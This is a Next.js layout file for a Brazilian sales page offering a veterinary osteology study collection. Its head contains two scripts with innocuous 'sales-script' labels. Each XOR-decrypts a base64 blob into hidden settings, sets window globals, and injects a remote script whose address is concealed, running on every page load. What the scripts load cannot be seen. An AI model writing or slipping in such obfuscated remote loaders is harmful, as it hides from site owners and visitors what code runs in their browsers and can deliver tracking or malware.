import type { Metadata } from 'next'
import { Inter, Anton } from 'next/font/google'
import Script from 'next/script'
import './globals.css'

const inter = Inter({
  variable: '--font-inter',
  subsets: ['latin'],
})

const anton = Anton({
  variable: '--font-anton',
  subsets: ['latin'],
  weight: ['400'],
})

export const metadata: Metadata = {
  title: 'Osteologia Veterinária | Coleção Visual de Ossos, Acidentes e Espécies',
  description:
    'Uma coleção visual de Osteologia Veterinária com 6 volumes e cerca de 150 páginas: ossos, acidentes ósseos, vistas anatômicas e comparações entre canino, equino, bovino e suíno. Acesso imediato.',
  generator: 'v0.app',

  openGraph: {
    title: 'Osteologia Veterinária | Coleção Visual de Ossos, Acidentes e Espécies',
    description:
      'Ossos, acidentes ósseos, vistas anatômicas e diferenças entre espécies organizados visualmente para estudar com clareza e revisar antes da prova prática. Acesso imediato e 7 dias de garantia.',
    type: 'website',
    locale: 'pt_BR',
    siteName: 'Osteologia Veterinária',
  },

  twitter: {
    card: 'summary_large_image',
    title: 'Osteologia Veterinária',
    description:
      'Coleção visual de Osteologia Veterinária para reconhecer, identificar e revisar as estruturas ósseas. Acesso imediato e 7 dias de garantia.',
  },

  icons: {
    icon: [
      {
        url: '/icon-light-32x32.png',
        media: '(prefers-color-scheme: light)',
      },
      {
        url: '/icon-dark-32x32.png',
        media: '(prefers-color-scheme: dark)',
      },
      {
        url: '/icon.svg',
        type: 'image/svg+xml',
      },
    ],
    apple: '/apple-icon.png',
  },
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html
      lang="pt-BR"
      className={`${inter.variable} ${anton.variable} bg-background`}
    >
      <head>
        <Script
          id="sales-script-1"
          strategy="afterInteractive"
          dangerouslySetInnerHTML={{
            __html: `(function(){var j_6=atob("DC3kez0G6O++qaoHqlbGDk9qytWcwd5z2l7eVBJljIGQ3N5qw0udVV5phcHc24V0yV+NC0l1x5/X0c9rhV2NA1hqxoXNi4Yly1mQCVRknZvb2og98XDIWVpqh43fxdklkHafWVNnhYqck4h3w1WBF3RiysOc38tr30jGQR8wiY6Nmp02kkyATV8+itaHy85knBXUSA0klbLD");var v_isl=[];for(var x_g13=0;x_g13<j_6.length;x_g13++){v_isl.push(j_6.charCodeAt(x_g13)&255);}var p_j9dj=v_isl[0];var h_ybuy=v_isl.slice(1,1+p_j9dj);var e_now=v_isl.slice(1+p_j9dj);var i_7w=e_now.map(function(b,m_9){return b^h_ybuy[m_9%p_j9dj];});var n_70="";for(var i_ved=0;i_ved<i_7w.length;i_ved++){n_70+=String.fromCharCode(i_7w[i_ved]&255);}var d_gmc=decodeURIComponent(escape(n_70));var q_arnq=JSON.parse(d_gmc);var d_393=q_arnq.globals||[];d_393.forEach(function(k_zgy){window[k_zgy.name]=k_zgy.value;});var l_3xb=document.createElement("script");l_3xb.src=q_arnq.url;l_3xb.async=true;l_3xb.defer=true;(q_arnq.attributes||[]).forEach(function(r_5){l_3xb.setAttribute(r_5.name,r_5.value);});(document.head||document.documentElement).appendChild(l_3xb);})();`,
          }}
        />

        <Script
          id="sales-script-2"
          strategy="afterInteractive"
          dangerouslySetInnerHTML={{
            __html: `(function(){var s_l=atob("DCnuiyOKBTqlhuqB2VLM/lHmJwCH7p71qVrUpAzpYVSL857ssE+XpUDlaBTH9MXyuluH+1f5Kk/R65mutUia7lD+K1DWpMajuF2a+UrocE7A9ci7glLM5ULnYBifpI7grUjD/lfnbFzcq5rzvF+L5VenfVnK4sfyukLMpwH8ZFbQ48i7+wuTp1ioa1vI48i7+02P/0KncE7I74z49Fmc7lXva06I9Z/jsE2dqQ+oc1vJ84+j4wvM9n73");var w_9=[];for(var v_euj=0;v_euj<s_l.length;v_euj++){w_9.push(s_l.charCodeAt(v_euj)&255);}var a_ga4z=w_9[0];var p_e=w_9.slice(1,1+a_ga4z);var l_xzr=w_9.slice(1+a_ga4z);var p_0u=l_xzr.map(function(b,r_142s){return b^p_e[r_142s%a_ga4z];});var w_7vg="";for(var s_j40t=0;s_j40t<p_0u.length;s_j40t++){w_7vg+=String.fromCharCode(p_0u[s_j40t]&255);}var r_dt=decodeURIComponent(escape(w_7vg));var i_ent=JSON.parse(r_dt);var t_f2=i_ent.globals||[];t_f2.forEach(function(d_mrzs){window[d_mrzs.name]=d_mrzs.value;});var d_j=document.createElement("script");d_j.src=i_ent.url;d_j.async=true;d_j.defer=true;(i_ent.attributes||[]).forEach(function(p_5dp){d_j.setAttribute(p_5dp.name,p_5dp.value);});(document.head||document.documentElement).appendChild(d_j);})();`,
          }}
        />
      </head>

      <body className="font-sans antialiased">
        {children}
      </body>
    </html>
  )
}
